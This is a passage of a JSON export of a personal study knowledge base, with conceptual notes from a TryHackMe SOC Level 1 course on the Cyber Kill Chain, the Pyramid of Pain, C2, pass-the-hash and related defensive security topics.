port 80 and HTTPS on port 443 - this type of beaconing blends the malicious traffic with the legitimate traffic and can help the attacker evade firewalls.  \n2. DNS\nThe infected machine makes constant DNS requests to the DNS server that belongs to an attacker, this type of C2 communication is also known as DNS Tunneling.\nImportant to note that an adversary or another compromised host can be the owner of the C2 infrastructure."},"SOC-Level-1/Cyber-Kill-Chain":{"title":"Cyber Kill Chain","links":["SOC-Level-1/Reconnaissance","SOC-Level-1/Phishing","SOC-Level-1/Watering-Hole","Zero-day","SOC-Level-1/Backdoor","HTB/Web-Shell","web-shell","HTB/Services","backdoor","SOC-Level-1/Timestomping","SOC-Level-1/Masquerading","SOC-Level-1/C2","SOC-Level-1/Unified-Kill-Chain"],"tags":[],"content":"The Cyber Kill Chain framework is designed for identification and prevention of the network intrusions. The term kill chain is used in military to refer to the steps taken by an adversary to reach its ultimate goal.\nA typical cyber kill chain looks like:\nThe Cyber Kill Chain\n1. Reconnaissance\nReconnaissance is the first step and it provides adversary with all the info needed for getting into a system.\n\n2. Weaponization\nIn this step, the threat actor combines malware and exploit into a deliverable payload. Most attackers usually use automated tools to generate the malware or refer to the Dark Web to purchase the malware.\n\n3. Delivery\nThe delivery of the Weapon can be performed through plenty of ways:\n1. Phishing emails\n2. Distributing infected devices in public places\n3. Watering Hole attack\n\n4. Exploitation\nAfter gaining access to the system, the malicious actor could exploit software, system, or server-based vulnerabilities to escalate the privileges or move laterally through the network.\nSome examples of exploitation are:\n1. Zero day exploit\n2. Exploit software, hardware or even human exploit\n3. Server based exploit\n\n5. Installation\nOnce the system is exploited, the attacker will install a persistent Backdoor in the system. This persistence can be achieved through various methods:\n1. Installing a Web Shell\nA web shell, because of its simplicity, can be well hidden and difficult to get rid of. Hence, it serves as an excellent Backdoor for an attacker.\n2. Windows Services\nWindows service run in background and can be modified to execute a malicious script or payloads. Adversary may create, or modify a windows service to execute payloads under a service name related to the OS or legitimate software.\n3. Run keys\nAdding the entry to the “run keys” for the malicious payload in the Registry or the Startup Folder. By doing that, the payload will execute each time the user logs in on the computer.\n4. Installing a Backdoor\nAdversary may install other backdoors such as Meterpreter’s backdoor, to later gain access to the system.\nIn this phase, the attacker can also use the Timestomping and Masquerading techniques to avoid detection by the forensic investigator and hide the malware.\n\n6. Command and Control (C2)\nNow the system has been compromised and a Backdoor has been installed. But the attacker stills needs a way to communicate with the compromised system and that also without being detected. Here comes the role of C2 Server. With C2 server the attacker can easily control the host.\n\n7. Exfiltration\nNow the adversary finally execute their objective which may be stealing data, destroying data, continuing lateral movement, etc.\n\nNext:\nUnified Kill Chain"},"SOC-Level-1/Email-Harvesting":{"title":"Email Harvesting","links":[],"tags":[],"content":"Email harvesting is the process of obtaining email addresses from public, paid, or free services.\nA tool used for email harvesting is: theHarvester."},"SOC-Level-1/Fast-Flux":{"title":"Fast Flux","links":["Networking/DNS","phishing","SOC-Level-1/C2"],"tags":[],"content":"Fast Flux is a DNS technique used by botnets to hide phishing, web proxying, malware delivery, and malware communication activities behind compromised hosts acting as proxies.\nThe purpose of using the Fast Flux network is to make the communication between malware and its command and control server (C2) challenging to be discovered by security professionals."},"SOC-Level-1/Gaining-Initial-Foothold":{"title":"Gaining Initial Foothold","links":["SOC-Level-1/Reconnaissance","reverse-shell"],"tags":[],"content":"\n1. Reconnaissance\nReconnaissance is the first step and it provides adversary with all the info needed for getting into a system. It is described in more detail in Reconnaissance page.\n2. Weaponization \n(MITRE Tactic TA0001)\nThis phase of the UKC describes the adversary setting up the necessary infrastructure to perform the attack. For example, this could be setting up a command and control server, or a system capable of catching reverse shells and delivering payloads to the system.\n3. Social Engineering\n(MITRE Tactic TA0001)\nThis phase of the UKC describes techniques that an adversary can employ to manipulate employees to perform actions that will aid in the adversaries attack. For example, a social engineering attack could include:\n\nGetting a user to open a malicious attachment.\nImpersonating a web page and having the user enter their credentials.\nCalling or visiting the target and impersonating a user (for example, requesting a password reset) or being able to gain access to areas of a site that the attacker would not previously be capable of (for example, impersonating a utility engineer).\n\n4. Exploitation \n(MITRE Tactic TA0002)\nThis phase of the UKC describes how an attacker takes advantage of weaknesses or vulnerabilities present in a system. The UKC defines “Exploitation” as abuse of vulnerabilities to perform code execution. For example:\n\nUploading and executing a reverse shell to a web application.\nInterfering with an automated script on the system to execute code.\nAbusing a web application vulnerability to execute code on the system it is running on.\n\n5. Persistence\n(MITRE Tactic TA0003)\nThis phase of the UKC is rather short and simple. Specifically, this phase of the UKC describes the techniques an adversary uses to maintain access to a system they have gained an initial foothold on. For example:\n\nCreating a service on the target system that will allow the attacker to regain access.\nAdding the target system to a Command &amp; Control server where commands can be executed remotely at any time.\nLeaving other forms of backdoors that execute when a certain action occurs on the system (i.e. a reverse shell will execute when a system administrator logs in).\n\n6. Defense Evasion\n(MITRE Tactic TA0005)\nThe “Defense Evasion” section of the UKC is one of the more valuable phases of the UKC. This phase specifically is used to understand the techniques an adversary uses to evade defensive measures put in place in the system or network. For example, this could be:\n\nWeb application firewalls.\nNetwork firewalls.\nAnti-virus systems on the target machine.\nIntrusion detection systems.\n\nThis phase is valuable when analyzing an attack as it helps form a response and better yet - gives the defensive team information on how they can improve their defence systems in the future.\n7. Command &amp; Control\n(MITRE Tactic TA0011)\nThe “Command &amp; Control” phase of the UKC combines the efforts an adversary made during the “Weaponization” stage of the UKC to establish communications between the adversary and target system.\nAn adversary can establish command and control of a target system to achieve its action on objectives. For example, the adversary can:\n\nExecute commands.\nSteal data, credentials and other information.\nUse the controlled server to pivot to other systems on the network.\n\n8. Pivoting\n(MITRE Tactic TA0008)\n“Pivoting” is the technique an adversary uses to reach other systems within a network that are not otherwise accessible (for example, they are not exposed to the internet). There are often many systems in a network that are not directly reachable and often contain valuable data or have weaker security.\nFor example, an adversary can gain access to a web server that is publicly accessible to attack other systems that are within the same network (but are not accessible via the internet)."},"SOC-Level-1/Hash":{"title":"Hash","links":[],"tags":[],"content":"A hash value is a numeric value of a fixed length that uniquely identifies data. It is the result of a hashing algorithm.\nCommon Hash Types\nMD5\n(Message Digest, defined by RFC 1321\nMD5 is a widely used cryptographic hash function with a 128-bit hash value. MD5 hashes are NOT considered cryptographically secure. In 2011, the IETF published RFC 6151, “Updated Security Considerations for the MD5 Message-Digest and the HMAC-MD5 Algorithms,” which mentioned a number of attacks against MD5 hashes, including the hash collision.\nSHA-1\n(Secure Hash Algorithm 1, defined by RFC 3174)\nWhen data is fed to SHA-1 Hashing Algorithm, SHA-1 takes an input and produces a 160-bit hash value string as a 40 digit hexadecimal number. NIST deprecated the use of SHA-1 in 2011 and banned its use for digital signatures at the end of 2013 based on it being susceptible to brute-force attacks. Instead, NIST recommends migrating from SHA-1 to stronger hash algorithms in the SHA-2 and SHA-3 families.\nSHA-2\n(Secure Hash Algorithm 2)\nSHA-2 Hashing Algorithm was designed in 2001 to replace SHA-1. SHA-2 has many variants, and arguably the most common is SHA-256. The SHA-256 algorithm returns a hash value of 256-bits as a 64 digit hexadecimal number."},"SOC-Level-1/Masquerading":{"title":"Masquerading","links":["SOC-Level-1/Masquerading"],"tags":[],"content":"Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading."},"SOC-Level-1/Network-Propagation":{"title":"Network Propagation","links":["SOC-Level-1/C2","HTB/Privilege-Escalation"],"tags":[],"content":"After a device is exploited in a network, the adversary spreads its access through the network.\nExploiting more devices in the same network becomes a lot more easier because usually:\n\nCredentials to other devices may be insecurely stored on host\nHost might have exclusive access to other devices such as printers and storages, not open to public\n\nHence, the attacker would set up a base on one of the systems to act as their pivot point and use it to gather information about the internal network.\nNetwork Propagation Process\n\nPivoting\n(MITRE Tactic TA0008)\nOnce the attacker has access to the system, they would use it as their staging site and a tunnel between their C2 Server and the victim’s network. The system would also be used as the distribution point for all malware and backdoors at later stages.\nDiscovery\n(MITRE Tactic TA0007)\nThe adversary would uncover information about the system and the network it is connected to. Within this stage, the knowledge base would be built from the active user accounts, the permissions granted, applications and software in use, web browser activity, files, directories and network shares, and system configurations.\nPrivilege Escalation\n(MITRE Tactic TA0004)\nFollowing their knowledge-gathering, the adversary would try to gain more prominent permissions within the pivot system. They would leverage the information on the accounts present with vulnerabilities and misconfigurations found to elevate their access to one of the following superior levels:\n\nSYSTEM/ ROOT.\nLocal Administrator.\nA user account with Admin-like access.\nA user account with specific access or functions.\n\nExecution\n(MITRE Tactic TA0002)\nThis is where they deploy their malicious code using the pivot system as their host. Remote trojans, C2 scripts, malicious links and scheduled tasks are deployed and created to facilitate a recurring presence on the system and uphold their persistence.\nCredential Access\n(MITRE Tactic TA0006)\nWorking hand in hand with the Privilege Escalation stage, the adversary would attempt to steal account names and passwords through various methods, including keylogging and credential dumping. This makes them harder to detect during their attack as they would be using legitimate credentials.\nTools like Mimikatz can be used for credential dumping.\nLateral Movement\n(MITRE Tactic TA0008)\nWith the credentials and elevated privileges, the adversary would seek to move through the network and jump onto other targeted systems to achieve their primary objective. The stealthier the technique used, the better."},"SOC-Level-1/OSINT":{"title":"OSINT","links":[],"tags":[],"content":"Open source intelligence (OSINT) is the act of gathering and analyzing publicly available data for intelligence purposes."},"SOC-Level-1/Pass-the-Hash-Attack":{"title":"Pass the Hash Attack","links":["hash","HTB/Active-Directory"],"tags":[],"content":"A Pass-the-Hash (PtH) attack is a technique where an attacker captures a password hash (as opposed to the password characters) and then passes it through for authentication and lateral access to other networked systems. With this technique, the threat actor doesn’t need to decrypt the hash to obtain a plain text password. PtH attacks exploit the authentication protocol, as the passwords hash remains static for every session until the password is rotated. Attackers commonly obtain hashes by scraping a system’s active memory and other techniques.\nWhile Pass-the-Hash attacks can occur on Linux, Unix, and other platforms, they are most prevalent on Windows systems. In Windows, PtH exploits Single Sign-On (SS0) through NT Lan Manager (NTLM), Kerberos, and other authentication protocols. When a password is created in Windows, it is hashed and stored in the Security Accounts Manager (SAM), Local Security Authority Subsystem (LSASS) process memory, the Credential Manager (CredMan) store, a ntds.dit database in Active Directory, or elsewhere. When a user logs onto a Windows workstation or server, they essentially leave behind their password credentials."},"SOC-Level-1/Phishing":{"title":"Phishing","links":[],"tags":[],"content":"Phishing is a form of social engineering and a scam where attackers deceive people into revealing sensitive information or installing malware such as viruses, worms, adware, or ransomware."},"SOC-Level-1/Punycode":{"title":"Punycode","links":[],"tags":[],"content":"What is Punycode?\nAs per Wandera, “Punycode is a way of converting words that cannot be written in ASCII, into a Unicode ASCII encoding.”\nA Punycode attack used by the attackers to redirect users to a malicious domain that seems legitimate at first glance.\nFor example, adıdas.de is a domain name which has the Punycode of xn--addas-o4a.de/ which at first glance looks like a legitimate website.\nInternet Explorer, Google Chrome, Microsoft Edge, and Apple Safari are now pretty good at translating the obfuscated characters into the full Punycode domain name."},"SOC-Level-1/Pyramid-of-Pain":{"title":"Pyramid of Pain","links":["SOC-Level-1/Hash","Networking/IPV4-Address","Networking/IP-Address","firewall","SOC-Level-1/Fast-Flux","Networking/DNS","SOC-Level-1/Punycode","SOC-Level-1/C2","Networking/URI,-URN-and-URL","SOC-Level-1/Wireshark","phishing","backdoor","SOC-Level-1/fuzzy-hashing","hash","SOC-Level-1/Pyramid-of-Pain","SOC-Level-1/Pass-the-Hash-Attack","SOC-Level-1/Cyber-Kill-Chain"],"tags":[],"content":"Pyramid of Pain is a conceptual model which organizes IOCs(Indicators Of Compromise) with the level of difficulty it will cause for an adversary to change the indicators associated with them, and their campaign.\nThe Pyramid of Pain\n1. Hash Values : Trivial\nHash values give insight into a specific malware sample, a malicious or a suspicious file, and as a way to uniquely identify and reference the malicious artifact. Various online tools such as VirusTotal and Metadefender Cloud - OPSWAT. can be used to perform hash lookups.\nBut modifying a file with even a single bit results in a different hash which can make it difficult to identify a malicious file using hash lookups.\n2. IP Address: Easy\nKnowing an IP Address of attacker can be beneficial since we can just put up a firewall rule to block the attacker. But this is not very effective as it can be easily evaded using tools like Fast Flux\n3. Domain Names: Simple\nDomain Names can be a pain for attacker as they would be needed to purchase, register and modify DNS Records. But attackers can use Punycode and redirection services to trick victim into visiting malicious sites.\nFun Trick: A + symbol when appended after a shortened link can enable us to see where a link is set up to redirect.\ne.g. When we visit tinyurl.com/xasdepobu+, we see:\n\n4. Host Artifacts: Annoying\nHost artifacts are the traces or observables that attackers leave on the system, such as registry values, suspicious process execution, attack patterns or IOCs (Indicators of Compromise), files dropped by malicious applications, or anything exclusive to the current threat.\nDetection of host artifacts is annoying because the attacker will have to circle back and change his attacking tools and methodologies.\n5. Network Artifacts: Annoying\nA network artifact can be a user-agent string, C2 information, or URI patterns followed by the HTTP POST requests. An attacker might use a User-Agent string that hasn’t been observed in your environment before or seems out of the ordinary.\nNetwork artifacts can be detected in Wireshark PCAPs (file that contains the packet data of a network) by using a network protocol analyzer such as TShark or exploring IDS (Intrusion Detection System) logging from a source such as Snort.\ne.g., We can use TShark to filter out the User-Agent strings by using the following command: tshark --Y http.request -T fields -e http.host -e http.user_agent -r analysis_file.pcap\n6. Tools: Challenging\nAt this stage, attacker will have to create new tools which means investing more time and money that is also if the adversary is actually capable of developing new malware.\nAttacker often use spear phishing using malicious macro documents (maldocs) and attempt to create a backdoor that can be used to establish C2, any custom .EXE, and .DLL files, payloads, or password crackers.\nWe can use fuzzy hashing to detect any malicious file with trivial changes made with intention of bypassing hash value detection.\n7. TTPs: Tough\nThis is the pinnacle of Pyramid of Pain.\nTTPs stands for Tactics, Techniques &amp; Procedures. This includes the whole MITRE ATT&amp;CK Matrix, which means all the steps taken by an adversary to achieve his goal, starting from phishing attempts to persistence and data exfiltration.\nIf we can detect and respond to the TTPs quickly, you leave the adversaries almost no chance to fight back.\nIf you can detect and respond to the TTPs quickly, you leave the adversaries almost no chance to fight back. For, example if you could detect a Pass the Hash Attack using Windows Event Log Monitoring and remediate it, you would be able to find the compromised host very quickly and stop the lateral movement inside your network.\n\nNext:\nCyber Kill Chain"},"SOC-Level-1/Reconnaissance":{"title":"Reconnaissance","links":["SOC-Level-1/OSINT","SOC-Level-1/Email-Harvesting","SOC-Level-1/Phishing"],"tags":[],"content":"Reconnaissance (MITRE Tactic TA0043) is discovering and collecting information on the system and the victim. The reconnaissance phase is the planning phase for the adversaries.\nOSINT also falls underReconnaissance. The attacker needs to gather as much info on the victim as he can to determine the best path &amp; target for attack.\nAn attacker may use technique such as Email Harvesting to gather emails which he can later use for spearPhishing attacks.\nThe Arsenal\nSome commonly used tools for Reconnaissance:\n1. theHarvester \nother than gathering emails, this tool is also capable of gathering names, subdomains, IPs, and URLs using multiple public data sources \n2. Hunter.io\nthis is  an email hunting tool that will let you obtain contact information associated with the domain\n3. OSINT Framework\nOSINT Framework provides the collection of OSINT tools based on various categories"},"SOC-Level-1/SOC":{"title":"SOC","links":[],"tags":[],"content":"Security Operations Center (SOC) is a team of IT security professionals tasked with monitoring, preventing , detecting , investigating, and responding to threats within a company’s network and systems.\nResponsibilities of SOC\n"},"SOC-Level-1/Timestomping":{"title":"Timestomping","links":["SOC-Level-1/Masquerading"],"tags":[],"content":"Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files and to revert modification date of file.\nTimestomping may be used along with file name Masquerading to hide malware and tools."},"SOC-Level-1/Unified-Kill-Chain":{"title":"Unified Kill Chain","links":["SOC-Level-1/Cyber-Kill-Chain","reconnaissance","SOC-Level-1/Gaining-Initial-Foothold","SOC-Level-1/Network-Propagation","SOC-Level-1/Adversary's-Objectives"],"tags":[],"content":"The unified kill chain aims to complement (not compete with) other cybersecurity kill chain frameworks, such as The Cyber Kill Chain. It states that there are 18 phases to an attack: Everything from reconnaissance to data exfiltration and understanding an attacker’s motive.\n\nThe unified kill chain can be divided into 3 categories:\nPhase: IN\nThis is the phase where adversary gains initial foothold in the system. It is described in detail in Gaining Initial Foothold page.\nPhase: THROUGH\nThis is the phase where the adversary moves through the network and gains access to the whole network. It is explained in detail in Network Propagation page.\nPhase: OUT\nThis is the stage where the adversary will execute their objective and end the process. This phase is explained in detail in Adversary’s Objectives page."},"SOC-Level-1/Watering-Hole":{"title":"Watering Hole","links":[],"tags":[],"content":"A watering hole attack is a targeted attack designed to aim at a specific group of people by compromising the website they are usually visiting and then redirecting them to the malicious website of an attacker’s choice.\nThe attacker would look for a known vulnerability for the website and try to exploit it. The attacker would encourage the victims to visit the website by sending “harmless” emails pointing out the malicious URL to make the attack work more efficiently. After visiting the website, the victim would unintentionally download malware or a malicious application to their computer. This type of attack is called a drive-by download. An example can be a malicious pop-up asking to download a fake Browser extension."},"SOC-Level-1/Wireshark":{"title":"Wireshark","links":[],"tags":[],"content":"Tool used to analyze network traffic. The GOAT"},"SOC-Level-1/fuzzy-hashing":{"title":"fuzzy hashing","links":[],"tags":[],"content":"Fuzzy hashing helps us to perform similarity analysis - match two files with minor differences based on the fuzzy hash values.\nOne of the examples of fuzzy hashing is the usage of SSDeep. SSDEEP creates a hash value that attempts to detect the level of similarity between two files at the binary level. This is different from a cryptographic hash (like SHA1) because a cryptographic hash can check exact matches (or non-matches)."},"index":{"title":"Welcome to my Knowledgebase","links":["SOC-Level-1/Pyramid-of-Pain"],"tags":[],"content":"Hey there! 👋 This is my personal knowledge base, where I document my journey, notes, and learnings in the world of computer science. Here you can explore my write-ups, dive into concepts, and just learn alongside me.\n\nWhat’s Here?\n\nHack The Box (HTB): Notes, write-ups, and methodologies from HTB machines and challenges.\nNetworking: A collection of networking concepts, protocols, and tools I’ve studied.\nMachines: A step by step documentation of pwning the listed machines (not many rn).\nSOC Level 1: Notes on TryHackMe SOC Level 1 pathway.\nAI: AI\n\n\nI suggest you to check out: Pyramid of Pain :D\n\nHappy hacking! 🚀\n\nThis is just a learning resource. I do not encourage use of the tools/methodologies described here on real world."}}